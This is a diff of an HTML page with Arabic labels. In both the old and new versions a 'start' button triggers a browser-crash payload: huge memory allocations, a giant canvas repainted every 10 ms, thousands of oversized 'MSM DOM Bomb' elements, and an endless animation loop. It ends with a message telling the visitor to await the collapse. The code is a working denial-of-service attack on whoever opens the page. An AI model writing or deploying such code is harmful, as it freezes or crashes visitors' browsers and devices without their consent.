@@ -1,77 +1,49 @@
-<style>
-  body {
-    margin: 0;
-    padding: 0;
-    height: 100vh;
-    background-color: #000; /* خلفية سوداء تمامًا */
-    display: flex;
-    align-items: center;
-    justify-content: center;
-  }
-
-  #startBtn {
-    padding: 25px 60px;
-    font-size: 24px;
-    font-weight: bold;
-    color: white;
-    background-color: #ff0000;
-    border: none;
-    border-radius: 14px;
-    box-shadow: 0 0 30px #f00;
-    cursor: pointer;
-    transition: transform 0.2s ease;
-  }
-
-  #startBtn:hover {
-    transform: scale(1.05);
-  }
-</style>
-
-<button id="startBtn">🔥 اضغط للبدء 🔥</button>
+<button id="startBtn" style="padding:15px 30px;font-size:18px;font-family:monospace;background:#111;color:#fff;border:2px solid #f00;border-radius:8px;cursor:pointer;">
+🔥 بدء الضغط
+</button>
 
 <script>
-  document.getElementById("startBtn").onclick = () => {
-    let memory = [];
-    function overload() {
-      for (let i = 0; i < 12; i++) {
-        memory.push(new Array(50000000).fill("MSM"+i));
-      }
+document.getElementById("startBtn").onclick = () => {
+  let memory = [];
+  function overload() {
+    for (let i = 0; i < 12; i++) {
+      memory.push(new Array(50000000).fill("MSM"+i));
     }
+  }
 
-    function canvasChaos() {
-      let canvas = document.createElement("canvas");
-      canvas.width = 30000;
-      canvas.height = 30000;
-      document.body.appendChild(canvas);
-      let ctx = canvas.getContext("2d");
-      setInterval(() => {
-        ctx.fillStyle = "rgba(255,0,0,0.5)";
-        ctx.fillRect(Math.random()*30000, Math.random()*30000, 5000, 5000);
-      }, 10);
+  function canvasChaos() {
+    let canvas = document.createElement("canvas");
+    canvas.width = 30000;
+    canvas.height = 30000;
+    document.body.appendChild(canvas);
+    let ctx = canvas.getContext("2d");
+    setInterval(() => {
+      ctx.fillStyle = "rgba(255,0,0,0.5)";
+      ctx.fillRect(Math.random()*30000, Math.random()*30000, 5000, 5000);
+    }, 10);
+  }
+
+  function domBomb() {
+    for (let i = 0; i < 5000; i++) {
+      let el = document.createElement("div");
+      el.innerText = "💣 MSM DOM Bomb 💣";
+      el.style = "width:10000px;height:10000px;opacity:0.1;background:repeating-linear-gradient(#f00, #000)";
+      document.body.appendChild(el);
     }
+  }
 
-    function domBomb() {
-      for (let i = 0; i < 5000; i++) {
-        let el = document.createElement("div");
-        el.innerText = "💣 MSM DOM Bomb 💣";
-        el.style = "width:10000px;height:10000px;opacity:0.1;background:repeating-linear-gradient(#f00, #000)";
-        document.body.appendChild(el);
-      }
+  function frameLoop() {
+    function trap() {
+      document.body.style.background = `hsl(${Math.random()*360}, 100%, 50%)`;
+      requestAnimationFrame(trap);
     }
+    trap();
+  }
 
-    function frameLoop() {
-      function trap() {
-        document.body.style.background = "#000"; // نثبت الخلفية سوداء حتى مع التكرار
-        requestAnimationFrame(trap);
-      }
-      trap();
-    }
-
-    overload();
-    canvasChaos();
-    domBomb();
-    frameLoop();
-
-    const alertBox = document.createElement("div");
-    alertBox.innerText = "⚠️ MSM Loader: انتظر الانهيار...";
-    alertBox.style = "position
+  overload();
+  canvasChaos();
+  domBomb();
+  frameLoop();
+  document.body.innerText = "⚠️ MSM Loader: انتظر الانهيار...";
+};
+</script>
